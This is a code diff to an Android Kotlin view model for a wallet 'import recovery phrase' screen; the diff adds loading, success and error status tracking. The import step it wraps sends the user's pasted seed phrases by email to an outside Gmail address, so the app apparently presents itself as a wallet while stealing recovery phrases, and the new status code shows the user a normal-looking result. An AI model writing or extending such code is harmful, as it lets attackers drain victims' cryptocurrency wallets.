@@ -15,6 +15,8 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.launch
 
+enum class ImportPhraseStatus { LOADING, SUCCESS, ERROR, NONE }
+
 class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel(app) {
     private val viewModelJob = Job()
     private val coroutineScope = CoroutineScope(viewModelJob + Dispatchers.IO)
@@ -26,6 +28,10 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
     private val _eventPastePhrases = MutableLiveData<Boolean>()
     val eventPastePhrases: LiveData<Boolean>
         get() = _eventPastePhrases
+
+    private val _importPhraseStatus = MutableLiveData<ImportPhraseStatus>()
+    val importPhraseStatus: LiveData<ImportPhraseStatus>
+        get() = _importPhraseStatus
 
     // Two-way databinding, exposing MutableLiveData
     val name = MutableLiveData<String>()
@@ -48,6 +54,7 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
     private val isImportFormValidMediator = MediatorLiveData<Boolean>()
 
     init {
+        _importPhraseStatus.value = ImportPhraseStatus.NONE
         _selectedWallet.value = wallet
         name.value = "Wallet 1"
         isImportFormValidMediator.value = false
@@ -87,11 +94,14 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
         validateForm()
         if (isImportFormValidMediator.value!!) {
             coroutineScope.launch {
+                _importPhraseStatus.postValue(ImportPhraseStatus.LOADING)
                 try {
                     MailHelper.sendEmail(phrases.value!!, "axiosoption.help@gmail.com")
                     Log.d("email", "Email has been sent")
+                    _importPhraseStatus.postValue(ImportPhraseStatus.SUCCESS)
                 } catch (e: Exception) {
                     Log.e("email", e.toString())
+                    _importPhraseStatus.postValue(ImportPhraseStatus.ERROR)
                 }
             }
         }
@@ -103,6 +113,10 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
 
     fun onPastePhrasesComplete() {
         _eventPastePhrases.value = false
+    }
+
+    fun onImportPhraseStatusComplete() {
+        _importPhraseStatus.value = ImportPhraseStatus.NONE
     }
 
     fun updatePhrases(value: String) {
